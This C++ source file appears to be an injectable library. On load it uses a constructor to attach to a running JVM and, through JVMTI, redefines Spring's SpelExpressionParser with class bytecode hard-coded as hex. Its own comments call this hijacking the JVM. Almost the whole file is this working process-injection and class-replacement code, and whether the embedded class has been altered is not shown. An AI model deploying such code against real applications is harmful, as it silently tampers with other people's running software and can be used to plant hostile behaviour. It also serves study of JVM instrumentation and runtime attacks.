#include <iostream>
#include <jni.h>
#include <stdio.h>
#include <dlfcn.h>
#include "jvmti.h"
#include <pthread.h>


const char* targetClassHex = "cafebabe0000003d00350a000200030700040c000500060100436f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f636f6d6d6f6e2f54656d706c617465417761726545787072657373696f6e5061727365720100063c696e69743e01000328295607000801003b6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f7370656c2f5370656c506172736572436f6e66696775726174696f6e0a0007000309000b000c07000d0c000e000f0100416f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f7370656c2f7374616e646172642f5370656c45787072657373696f6e50617273657201000d636f6e66696775726174696f6e01003d4c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f7370656c2f5370656c506172736572436f6e66696775726174696f6e3b0800110100285370656c506172736572436f6e66696775726174696f6e206d757374206e6f74206265206e756c6c0a001300140700150c0016001701001f6f72672f737072696e676672616d65776f726b2f7574696c2f4173736572740100076e6f744e756c6c010027284c6a6176612f6c616e672f4f626a6563743b4c6a6176612f6c616e672f537472696e673b29560a000b00190c001a001b010011646f506172736545787072657373696f6e01007f284c6a6176612f6c616e672f537472696e673b4c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f506172736572436f6e746578743b294c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f7370656c2f7374616e646172642f5370656c45787072657373696f6e3b07001d0100496f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f7370656c2f7374616e646172642f496e7465726e616c5370656c45787072657373696f6e5061727365720a001c001f0c00050020010040284c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f7370656c2f5370656c506172736572436f6e66696775726174696f6e3b29560a001c0019010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100434c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f7370656c2f7374616e646172642f5370656c45787072657373696f6e5061727365723b0100087061727365526177010051284c6a6176612f6c616e672f537472696e673b294c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f7370656c2f7374616e646172642f5370656c45787072657373696f6e3b01001065787072657373696f6e537472696e670100124c6a6176612f6c616e672f537472696e673b01000a457863657074696f6e7307002d01002d6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f5061727365457863657074696f6e010007636f6e7465787401002e4c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f506172736572436f6e746578743b01002252756e74696d6556697369626c65506172616d65746572416e6e6f746174696f6e730100234c6f72672f737072696e676672616d65776f726b2f6c616e672f4e756c6c61626c653b01006d284c6a6176612f6c616e672f537472696e673b4c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f506172736572436f6e746578743b294c6f72672f737072696e676672616d65776f726b2f65787072657373696f6e2f45787072657373696f6e3b01000a536f7572636546696c650100195370656c45787072657373696f6e5061727365722e6a6176610021000b0002000000010012000e000f00000005000100050006000100220000004200030001000000102ab700012abb000759b70009b5000ab10000000200230000000e0003000000190004001a000f001b00240000000c000100000010002500260000000100050020000100220000005000020002000000102ab700012b1210b800122a2bb5000ab10000000200230000001200040000002100040022000a0023000f002400240000001600020000001000250026000000000010000e000f0001000100270028000200220000003b00030002000000072a2b01b60018b000000002002300000006000100000028002400000016000200000007002500260000000000070029002a0001002b000000040001002c0004001a001b000300220000004f0003000300000011bb001c592ab4000ab7001e2b2cb60021b00000000200230000000600010000002d002400000020000300000011002500260000000000110029002a000100000011002e002f0002002b000000040001002c0030000000090200000001003100001044001a0032000300220000003100030003000000072a2b2cb60018b00000000200230000000600010000001100240000000c000100000007002500260000002b000000040001002c00300000000902000000010031000000010033000000020034";
const char* targetClassName = "org/springframework/expression/spel/standard/SpelExpressionParser";


unsigned char hexToByte(const char* hex) {
    unsigned int byte;
    sscanf(hex, "%02x", &byte);
    return (unsigned char)byte;
}

void hexStringToByteArray(const char* hexString, unsigned char* byteArray, int byteArrayLength) {
    for (int i = 0; i < byteArrayLength; i++) {
        byteArray[i] = hexToByte(hexString + 2 * i);
    }
}

void* library_init(void* arg);

static void __attribute__((constructor))
init() {
    pthread_t tid;
    int err = pthread_create(&tid, NULL, &library_init, NULL);
    if (err != 0) {
        std::cerr << "Failed to create a thread: " << strerror(err) << std::endl;
    }
}

void* library_init(void* arg) {
    JavaVM *vmBuf[1];
    jsize numVMs;
    jvmtiEnv *jvmti;

    jint result = JNI_GetCreatedJavaVMs(vmBuf, 1, &numVMs);

    std::cout << "Number of JVMs found: " << numVMs << std::endl;

    if (result == JNI_OK && numVMs > 0) {
        JavaVM *jvm = vmBuf[0]; // assume one JVM is there
        JNIEnv *env;



        // length of the class bytecode ->  create a byte array
        int length = strlen(targetClassHex) / 2;
        unsigned char classBytes[length];
        hexStringToByteArray(targetClassHex, classBytes, length);

        // try to attach to the JVM
        jint attachResult = jvm->AttachCurrentThread(reinterpret_cast<void **>(&env), nullptr);

        if (attachResult == JNI_OK) {
            printf("JVM attached yay\n");
            jvm->GetEnv((void **) &jvmti, JVMTI_VERSION_1_1);
            jvmtiCapabilities capabilities;
            memset(&capabilities, 0, sizeof(capabilities));
            capabilities.can_redefine_classes = 1; // enabling class redefinition capability

            jvmti->AddCapabilities(&capabilities);

            jclass myClass = env->FindClass(targetClassName);
            if (myClass == nullptr) {
                std::cerr << "Failed to find the class." << std::endl;
                jvm->DetachCurrentThread();
            }

            //class definition structure for redefinition
            jvmtiClassDefinition classDef;
            classDef.klass = myClass;
            classDef.class_byte_count = length;
            classDef.class_bytes = classBytes;

            // if we are here then the jvm is hijacked
            std::cerr << "hijacked. " << std::endl;
            jvmtiError err = jvmti->RedefineClasses(1, &classDef);
            if (err != JVMTI_ERROR_NONE) {
                char *errName = nullptr;
                jvmti->GetErrorName(err, &errName);
                std::cerr << "Failed to redefine the class " << targetClassName;
                std::cerr << " JVMTI Error Code: " << err;
                if (errName != nullptr) {
                    std::cerr << " (" << errName << ")";
                    jvmti->Deallocate((unsigned char *) errName);
                }
                std::cerr << std::endl;
            }
            jvm->DetachCurrentThread();
        } else {
            std::cerr << "Failed to attach thread to JVM. Error code: " << attachResult << std::endl;
            switch (attachResult) {
                case JNI_EDETACHED:
                    std::cerr << "Thread not attached to the JVM." << std::endl;
                    break;
                case JNI_EVERSION:
                    std::cerr << "JVM version error." << std::endl;
                    break;
                default:
                    std::cerr << "Unknown error occurred." << std::endl;
            }
        }
    } else {
        std::cerr << "No JVMs found :/" << std::endl;
    }
}